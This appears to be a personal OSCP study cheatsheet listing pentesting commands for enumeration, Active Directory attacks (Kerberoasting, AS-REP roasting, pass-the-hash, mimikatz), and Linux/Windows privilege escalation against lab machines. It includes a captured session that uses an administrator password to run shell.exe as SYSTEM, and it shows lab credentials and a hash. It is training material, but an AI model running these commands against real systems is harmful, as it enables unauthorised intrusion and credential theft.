---
title: "OSCP cheatsheet"
date: 2022-12-07T01:29:39+00:00
categories:
  - oscp
tags:
  - redteam
  - pentest
  - oscp
---

## port discovery

### nmapAutomator

`nmapAutomator.sh -H <host> -t full`

### masscan

`masscan -p1-65535,U1:65535 <IP> --rate=1000 -e tun0`

### nmap
*for port discovery*
`nmap -T4 --min-rate=1000 -p- <IP>`

*script scan*
`nmap -sC -sV -p <ports> <IP>`

*combining two command*
```bash
ports=$(nmap -p- --min-rate=1000 -T4 10.129.1.77 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)  
nmap -sC -sV -p$ports 10.129.1.77
```

network scan
`**nmap -sS -O scanme.nmap.org/24**`
### udp scan
`/opt/udp-proto-scanner/udp-proto-scanner.pl <IP>`

## ftp

### login to ftp server

`ftp <IP>`

- always try anonymous login
- try passive mode
- try binary mode to transfer
- check if able to upload and execute somewhere else
- use dir -a option to show hidden file

## ssh

### login to ssh server
`ssh <user>@<IP>`
or add -i options to use private key

- beware of key algorithm
- try using username as password, you never know
- beware of lockout for too many failed try

### ssh shell escape
`ssh <Username>@<IP-Adress> -t "bash --noprofile"`

### ssh key generate
`ssh-keygen -t rsa`

we can modify authorized_keys in .ssh folder to use our own pair of key instead

## smtp
`nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 {IP}`

- good for user enum
- check shell shock

## dns

### zone transfer
`dig axfr @<IP> <DOMAIN>`

### bruteforce
`gobuster dns -d horizontall.htb -w list.txt`

## http/https

### gobuster

`gobuster dir -w <wordlist> -u <URL> -x <file extension> -t <no. of thread>`

- sometimes we can try to run gobuster again on newly discovered directory
- beware of no. of thread, don't break the box
- try different wordlists if needed
- use -k to skip tls cert verification
- check cgi-bin to look for .sh or .cgi files

### nikto
`nikto -h <url>`

- sometimes it can discover vulnerability
- cgi-bin
- webdav
- shellshock
- heartbleed
- check server hosting software version
- look for CMS
- check robots.txt (sometimes it only allows certain user agent to access page)
- check error page
- check PUT method
- webdav
### wpscan
`wpscan --url <URL>`
use on wordpress site
- check if there are vulnerable plugins
- brute admin password
- find users
### cewl
generate wordlist for creds bruteforce

`cewl -d 5 -m 3 http://postfish.off/team.html -w cewl.txt`

- username and email address are importants
- always look for employee list
- check if user has post anything, could be hint to password or foothold
### WAF bypass
add Header **X-Forwarded-For** to bypass IP restriction

### File Upload
- check if file extension is allowed, sometimes need to change extension to make exploit work
- if only allows images file, we can use magic number method to bypass

### other important notes
- check sql injection (use different techniques e.g. error based, union select, blind, etc.)
	- good cheatsheet: https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
	- blind sql injection can be painful, we can use some script to help us
- check nosql injection
- LFI and RFI (wrappers can be useful e.g. php:// smb://)
- XSS
- command injection
- SSRF (sometimes we can use responder to catch NTLM from target's request)
- check cookies
- check Node.js deserialization
- check file upload (and restrcition of file type)
- check source code
- check what programming language the website use
- error 403 does not mean dead end, it can give away service version and if it is a directory you can try to access the files inside of it instead.
- Here is a pretty good mindmap
	- https://guide.offsecnewbie.com/web
- check certificate for alt name
- look for default credentials and try common credentials (something it requires guessing)

## smb

### Connect/Listing Shares
```bash
#Connect using smbclient
smbclient --no-pass //<IP>/<Folder>
smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash
#Use --no-pass -c 'recurse;ls'  to list recursively with smbclient

#List with smbmap, without folder it list everything
smbmap [-u "username" -p "password"] -R [Folder] -H <IP> [-P <PORT>] # Recursive list
smbmap [-u "username" -p "password"] -r [Folder] -H <IP> [-P <PORT>] # Non-Recursive list
smbmap -u "username" -p "<NT>:<LM>" [-r/-R] [Folder] -H <IP> [-P <PORT>] #Pass-the-Hash
```

### Obtain Information
```bash
#Dump interesting information
enum4linux -a [-u "<username>" -p "<passwd>"] <IP>
enum4linux-ng -A [-u "<username>" -p "<passwd>"] <IP>
nmap --script "safe or smb-enum-*" -p 445 <IP>

#Connect to the rpc
rpcclient -U "" -N <IP> #No creds
rpcclient //machine.htb -U domain.local/USERNAME%754d87d42adabcca32bdb34a876cbffb  --pw-nt-hash
#You can use querydispinfo and enumdomusers to query user information

#Dump user information
/usr/share/doc/python3-impacket/examples/samrdump.py -port 139 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/samrdump.py -port 445 [[domain/]username[:password]@]<targetName or address>

#Map possible RPC endpoints
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 135 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 139 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 445 [[domain/]username[:password]@]<targetName or address>
```

### mount shares
```bash
mount -t cifs //x.x.x.x/share /mnt/share
mount -t cifs -o "username=user,password=password" //x.x.x.x/share /mnt/share
```

### Execute
Sometimes with right credentials it will give us shell or RCE
https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb#execute

### Exploit
test vulnerability like EternalBlue to get a easy win
nmap vuln script
`nmap -sV -p445 --script vuln <IP>`

### other notes
- can be used to test credentials
- also check write/read permission
- check shares with unusal names
- sometimes we can upload and execute the file somewhere else

## NFS
list shares
`showmount -e <IP>`

mount shares
`mount -t nfs [-o vers=2] <ip>:<remote_folder> <local_folder> -o nolock`

file permission
`If you mount a folder which contains files or folders only accesible by some user (by UID). You can create locally a user with that UID and using that user you will be able to access the file/folder.`
misconfiguration of NFS permission can leads to PE
https://book.hacktricks.xyz/linux-hardening/privilege-escalation/nfs-no_root_squash-misconfiguration-pe

## Active Directory

Very useful website:
[WADComs](https://wadcoms.github.io/)
useful mindmap:
https://www.xmind.net/m/5dypm8/
### ldapsearch
```bash
ldapsearch -v -x -b "DC=hutch,DC=offsec" -H "ldap://192.168.120.108" "(objectclass=*)"
```

- enum user accounts
- password policy
- check account description
- find service account

### bloodhound
use bloodhound remotely:
`bloodhound.py -d test.local -v --zip -c All -dc test.local -ns 10.10.10.1`

Alternative options ==> use binary or powershell script on target machine

start database
`neo4j console`

### mimikatz

**IMPORTANT** check mimikatz version, newer version does not work well on newer windows (mimikatz 2.1.1 works well for me)

check Mandatory Level, mimikatz need privilege

start a high intergrity level shell (may need UAC bypass):
`powershell.exe Start-Process cmd.exe -Verb runAs`

or using powershell:
```bash
c:\windows\system32\inetsrv>powershell
powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\windows\system32\inetsrv> $pw = ConvertTo-SecureString "T4E@d8!/od@l36" -AsPlainText -Force
$pw = ConvertTo-SecureString "T4E@d8!/od@l36" -AsPlainText -Force
PS C:\windows\system32\inetsrv>

PS C:\windows\system32\inetsrv> $creds = New-Object System.Management.Automation.PSCredential ("Administrator", $pw)
$creds = New-Object System.Management.Automation.PSCredential ("Administrator", $pw)
PS C:\windows\system32\inetsrv>

PS C:\windows\system32\inetsrv> Invoke-Command -Computer hutchdc -ScriptBlock { schtasks /create /sc onstart /tn shell /tr C:\inetpub\wwwroot\shell.exe /ru SYSTEM } -Credential $creds
Invoke-Command -Computer hutchdc -ScriptBlock { schtasks /create /sc onstart /tn shell /tr C:\inetpub\wwwroot\shell.exe /ru SYSTEM } -Credential $creds
SUCCESS: The scheduled task "shell" has successfully been created.
PS C:\windows\system32\inetsrv>

PS C:\windows\system32\inetsrv> Invoke-Command -Computer hutchdc -ScriptBlock { schtasks /run /tn shell } -Credential $creds
Invoke-Command -Computer hutchdc -ScriptBlock { schtasks /run /tn shell } -Credential $creds
SUCCESS: Attempted to run the scheduled task "shell".
PS C:\windows\system32\inetsrv>
```

### kerbrute
user enum
`kerbrute userenum --dc egotistical-bank.local -d egotistical-bank.local /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt -t 40`

### rpcclient
useful website
https://www.hackingarticles.in/active-directory-enumeration-rpcclient/
conntect to target
`rpcclient -U '' 10.129.1.77`

enum users
`enumdomusers`

users query
`queryuser user01`

change password if have privilege (good for lateral movement)
`chgpasswd raj Password@1 Password@987`
### other userful tips

boxes related to active directory:

HTB: active sauna forest
proving ground: Hutch Heist Vault

use impacket-GetUserSPNs to get TGS tickets
`impacket-GetUserSPNs egotistical-bank.local/fsmith:Thestrokes23 -dc-ip 10.10.10.175 -request`

or do it with powershell:
```
Add-Type -AssemblyName System.IdentityModel;
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'MSSQLSvc/ad-app23.ad.com:1433' 
```

if facing clock skew issue:
`sudo ntpdate <IP>`

lateral movement could require port forwarding, in that case chisel is my go-to
https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html#examples

finding ip addess of machine
```
PS C:\Windows\system32> ping ad-app23
ping ad-app23

Pinging ad-app23.ad.com [10.11.1.121] with 32 bytes of data:
Reply from 10.11.1.121: bytes=32 time<1ms TTL=128

```

or use nslookup, this example shows how to find domain controller ip
```cmd
C:\Windows\system32>nslookup
DNS request timed out.
    timeout was 2 seconds.
Default Server:  UnKnown
Address:  10.11.1.120

> set type=all
>_ldap._tcp.dc._msdcs.dc.com
Server:  UnKnown
Address:  10.11.1.120

_ldap._tcp.dc._msdcs.ad.com    SRV service location:
          priority       = 0
          weight         = 100
          port           = 389
          svr hostname   = ad-dc01.ad.com
ad-dc01.ad.com        internet address = 10.11.1.120
> 
```

PowerView script can be useful for enumeration with a shell
https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1

harvest the non-preauth AS_REP responses of users
`python3 GetNPUsers.py -dc-ip 10.129.1.77 -request 'htb.local/' -format hashcat`

if cannot crack hash, try passing the hash


# Privilege Escalation

## Linux
useful website
- https://mil0.io/linux-privesc/#exploiting-suidguidsudo-with-environment-variables
- hacktricks
- https://guide.offsecnewbie.com/privilege-escalation/linux-pe
useful tools
- linpeas.sh
- suid3num.py
- linux-exploit-suggestor.sh
- linenum.sh
- pspy

### sudo
check sudo rights:
`sudo -l`

check GTFO bins to see if the binary can give you root (same with SUID):
https://gtfobins.github.io/

### Check list
- sudo `sudo -l`
- kernel version for exploit
- /etc/passwd (can add privileged user if have write permission)
- /etc/shadow (see if there is a backup)
- cron jobs
- ports only open locally `ss -antp` or `netstat -antup`
- `ifconfig` to see if device is connected to other subnet
- running proccess
	- `ps -aux`
- application config files for creds (especially for web app ==> e.g. config.php or .env)
- password reuse on other users or by guessing
- exploit for installed software
	```bash 
	dpkg -l | awk '$1 ~ /ii/{print $2,$3}'
	rpm -qa
	#copy output over to kali and run /scripts/linux/pkg_lookup.sh to find a vulnerable version or do below
	```
- mailbox (/var/mail or /var/spool/mail)
- file permisison
	- `find / -user <USER>`
	- `find / -group <USER'S GROUP>`
- database server (check version to look for exploit)
- Capabilities
- SUID binary (GTFObins for the win)
	- suid3num.py
	- `find / -perm /4000`
- user permission 
	- `id`
- docker environment
- ssh keys (check write permission) 
- console history
- analyze binary
	- `ltrace`
- Log Files
## Windows
useful website
https://guide.offsecnewbie.com/privilege-escalation/windows-pe
https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation
useful tools:
winPEAS

### registry
```
# VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

# Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# SNMP Paramters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# Search for password in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

### Check list
- systeminfo
- kernel exploit
	- https://kakyouim.hatenablog.com/entry/2020/05/27/010807
	- watch for patches or anti virus
	- Sherlock.ps1
- user privilege
	- `whoami /all`
	- SeImpersonatePrivilege ==> juicy potato or print spool depends on windows version
- open ports
	- `netstat -ano`
- running process
	- `tasklist`
- installed software
	- `Program Files` or `Program Files (x86)`
- config files
	- e.g. XAMPP
- running services
	- `sc query state= all | findstr "SERVICE_NAME:" >> Servicenames.txt`
	- check if we have write permission to folder
	- Auto run or restart service
	- unquoted service path
- file permission
	- `icacls` 
	- write permission in web app directory to get service account
- registry or program data
	- look for NTDS.DIT, SAM, SYSTEM etc. to find user hash
- password reuse
- console history
	- `%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`
- brute user password
	- https://github.com/galkan/crowbar
- Appdata (application settings file may contain creds)
- other users
	- `net users`
- firewall settings
	- ` netsh firewall show state` or `netsh firewall show config`  
	- use chisel for port forwarding
- Log files
## General Tips
### test connectivity
tcpdump
`sudo tcpdump -i tun0 icmp and icmp[icmptype]=icmp-echo`